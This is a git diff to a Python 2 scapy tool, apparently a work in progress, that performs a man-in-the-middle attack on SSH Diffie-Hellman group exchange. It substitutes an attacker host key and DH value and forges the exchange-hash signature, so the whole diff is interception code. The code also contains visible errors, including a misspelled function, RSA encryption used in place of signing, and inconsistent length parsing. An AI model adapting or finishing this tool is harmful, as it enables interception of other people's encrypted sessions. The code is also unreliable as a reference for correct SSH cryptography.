@@ -1,5 +1,8 @@
 from scapy.all import *
-import sys, os, time, binascii
+import sys, os, time, binascii, hashlib
+from Crypto.PublicKey import RSA
+from Crypto.Random import get_random_bytes
+from Crypto.Cipher import AES, PKCS1_OAEP
 
 KEX_INIT = 20
 DH_GEX_REQ = 34
@@ -23,6 +26,7 @@ class Pretender:
 			"ack": None,
 			"plen": None, # payload_len
 			"expected_ack": None, # expected ack number
+			"V_C": None, # client ssh version
 			"I_C": None, # kex init payload
 			"min": None, # min size in bits for group (p, g)
 			"n": None, # preferred size in bits for group (p, g)
@@ -38,6 +42,7 @@ class Pretender:
 			"ack": None,
 			"plen": None, # payload_len
 			"expected_ack": None, # expected ack number
+			"V_S": None, # server ssh version
 			"I_S": None, # kex init payload
 			"secret_key": 3,
 			"shared_key": None,
@@ -152,11 +157,18 @@ class Pretender:
 
 	def parseSSH (self, raw, from_client):
 		payload = SSH(raw)
-		if payload == None:
+		if payload.err:
 			return
 		#endif
 
-		if payload.SSH_MSG_KEXINIT == KEX_INIT:
+		if payload.SSH_VEX == True:
+			if from_client:
+				self.fake_client["V_C"] = self.v
+			else:
+				self.fake_server["V_S"] = self.v
+			#endif
+			return
+		elif payload.SSH_MSG_KEXINIT == KEX_INIT:
 			if from_client:
 				self.fake_client["I_C"] = raw
 			else:
@@ -194,17 +206,45 @@ class Pretender:
 			else:
 				# Host key
 				host_len = len(payload.host_key)
-				payload.host_key = None
+				fake_host_key = \
+				int_to_hex(len(payload.rsa["alg"]),4) + payload.rsa["alg"] + \
+				int_to_hex(len(payload.rsa["e"]),4) + int_to_hex(self.fake_server["rsa_key"]["e"],len(payload.rsa["e"])) + \
+				int_to_hex(len(payload.rsa["n"]),4) + int_toHex(self.fake_server["rsa_key"]["n"],len(payload.rsa["n"]))
+				payload.host_key = fake_host_key
 				# F
 				self.f = int(binascii.hexlify(payload.f),16)
 				f_len = len(payload.f)
 				fake_f = (self.g**self.fake_server["secret_key"]) % self.p
 				payload.f = int_to_hex(fake_f, f_len)
-				# Signature
-				fake_sig = None
 				# Shared key
 				self.fake_server["shared_key"] = (self.e**self.fake_server["secret_key"]) % self.p
 				self.fake_client["shared_key"] = (self.f**self.fake_client["secret_key"]) % self.p
+				# Signature
+				h_string = \
+				self.fake_client["V_C"] + \
+				self.fake_server["V_S"] + \
+				self.fake_client["I_C"] + \
+				self.fake_server["I_S"] + \
+				fake_host_key + \
+				int_to_hex(self.fake_client["min"],4) + \
+				int_to_hex(self.fake_client["n"],4) + \
+				int_to_hex(self.fake_client["max"],4) + \
+				int_to_hex(self.p,0) + \
+				int_to_hex(self.g,0) + \
+				int_to_hex(self.e,0) + \
+				int_to_hex(fake_f,0) + \
+				int_to_hex(self.fake_server["shared_key"],0)
+					# Hashed - SHA256
+				m = hashlib.sha256()
+				m.update(h_string)
+				digest = m.digest()
+					# Signed - RSA
+				key = RSA.construct((self.fake_server["rsa_key"]["n"],self.fake_server["rsa_key"]["e"],self.fake_server["rsa_key"]["d"]))
+				cipher_rsa = PKCS1_OAEP.new(key)
+				signed = cipher_rsa.encrypt(digest)
+				fake_sig = int_to_hex(payload.sig["alg"],4) + payload.sig["alg"] + \
+				int_to_hex(len(signed),4) + signed
+				payload.signature = fake_sig
 			#endif
 		#endif
 
@@ -222,13 +262,19 @@ class SSH:
 
 	def __init__ (self, payload):
 
+		self.err = False
+		self.SSH_VEX = False
+
 		if payload[0:2] == "SSH":
-			# This is SSH protocal
-			return None
+			# This is SSH version exchange
+			self.SSH_VEX = True
+			self.v = payload.strip()
+			return
 		#endif
 		if len(payload) % 2 != 0 or len(payload) < 6:
 			print "\nPayload length error: " + str(len(payload))
-			return None
+			self.err = True
+			return
 		#endif
 
 		self.packet_len = int(binascii.hexlify(payload[0:4]), 16)
@@ -306,6 +352,13 @@ class SSH:
 			host_len = int(payload[6:10],16)
 			self.host_key = payload[10:10+host_len]
 			rest = payload[10+host_len:]
+				# RSA
+			alg_len = int(self.host_key[0:4],16)
+			self.rsa["alg"] = self.host_key[4:4+alg_len]
+			rsa_e_len = int(self.host_key[4+alg_len:8+alg_len])
+			self.rsa["e"] = self.host_key[8+alg_len:8+alg_len+rsa_e_len]
+			rsa_n_len = int(self.host_key[8+alg_len+rsa_e_len:12+alg_len+rsa_e_len])
+			self.rsa["n"] = self.host_key[12+alg_len+rsa_e_len:12+alg_len+rsa_e_len+rsa_n_len]
 			# F
 			f_len = int(rest[0:4],16)
 			self.f = rest[4:4+f_len]
@@ -314,6 +367,9 @@ class SSH:
 			sig_len = int(rest[0:4],16)
 			self.signature = rest[4:4+sig_len]
 			rest = rest[4+sig_len:]
+				# Alg
+			sig_alg_len = int(self.signature[0:4],16)
+			self.sig["alg"] = self.signature[4:4+sig_alg_len]
 			# rest
 			self.rest = rest[0:-self.padding_len]
 		#endif
@@ -327,15 +383,15 @@ class SSH:
 			# Cookie
 			payload = payload + self.cookie
 			# Key exchange
-			payload = payload + len_to_hex(self.kex_algorithms,4) + self.kex_algorithms
+			payload = payload + int_to_hex(len(self.kex_algorithms),4) + self.kex_algorithms
 			# Host key
-			payload = payload + len_to_hex(self.pub_key_algorithms,4) + self.pub_key_algorithms
+			payload = payload + int_to_hex(len(self.pub_key_algorithms),4) + self.pub_key_algorithms
 			# Symmetric key
-			payload = payload + len_to_hex(self.sym_key_algorithms_ch,4) + self.sym_key_algorithms_ch
-			payload = payload + len_to_hex(self.sym_key_algorithms_hc,4) + self.sym_key_algorithms_hc
+			payload = payload + int_to_hex(len(self.sym_key_algorithms_ch),4) + self.sym_key_algorithms_ch
+			payload = payload + int_to_hex(len(self.sym_key_algorithms_hc),4) + self.sym_key_algorithms_hc
 			# MAC
-			payload = payload + len_to_hex(self.mac_algorithms_ch,4) + self.mac_algorithms_ch
-			payload = payload + len_to_hex(self.mac_algorithms_hc,4) + self.mac_algorithms_hc
+			payload = payload + int_to_hex(len(self.mac_algorithms_ch),4) + self.mac_algorithms_ch
+			payload = payload + int_to_hex(len(self.mac_algorithms_hc),4) + self.mac_algorithms_hc
 		elif self.SSH_MSG_KEXINIT == DH_GEX_REQ:
 			# Max
 			payload = payload + self.min
@@ -345,19 +401,19 @@ class SSH:
 			payload = payload + self.max
 		elif self.SSH_MSG_KEXINIT == DH_GEX_GROUP:
 			# P
-			payload = payload + len_to_hex(len(self.modulus),4) + self.modulus
+			payload = payload + int_to_hex(len(self.modulus),4) + self.modulus
 			# G
-			payload = payload + len_to_hex(len(self.base),4) + self.base
+			payload = payload + int_to_hex(len(self.base),4) + self.base
 		elif self.SSH_MSG_KEXINIT == DH_GEX_INIT:
 			# E
-			payload = payload + len_to_hex(len(self.e),4) + self.e
+			payload = payload + int_to_hex(len(self.e),4) + self.e
 		elif self.SSH_MSG_KEXINIT == DH_GEX_REPLY:
 			# Host key
-			payload = payload + len_to_hex(len(self.host_key),4) + self.host_key
+			payload = payload + int_to_hex(len(self.host_key),4) + self.host_key
 			# F
-			payload = payload + len_to_hex(len(self.f),4) + self.f
+			payload = payload + int_to_hex(len(self.f),4) + self.f
 			# Signature
-			payload = payload + len_to_hex(len(self.signature),4) + self.signature
+			payload = payload + int_to_hex(len(self.signature),4) + self.signature
 		#endif
 
 		# rest
@@ -366,7 +422,7 @@ class SSH:
 		padding_len = get_padlen(len(payload))
 		# Packet len
 		packet_len = 1 + len(payload) + padding_len
-		packet = len_to_hex(packet_len,4) + len_to_hex(padding_len,1) + payload + chr(0) * padding_len
+		packet = int_to_hex(packet_len,4) + int_to_hex(padding_len,1) + payload + chr(0) * padding_len
 		return packet
 	#enddef
 
@@ -385,11 +441,6 @@ def to_hex (ch):
 	return "{0:02x}".format(ord(ch))
 #enddef
 
-def len_to_hex (s, num_of_bytes):
-	# A quick way to turn the length of string into binary data with a specified number of bytes
-	return binascii.unhexlify("{0:0{1}x}".format(len(s),num_of_bytes*2))
-#enddef
-
 def int_to_hex (i, num_of_bytes):
 	# Turn an integer into binary data with a speicifed number of bytes
 	return binascii.unhexlify("{0:0{1}x}".format(i,num_of_bytes*2))
@@ -402,5 +453,3 @@ def get_padlen (payload_len):
 		#endif
 	#endfor
 #enddef
-
-print "Hello"
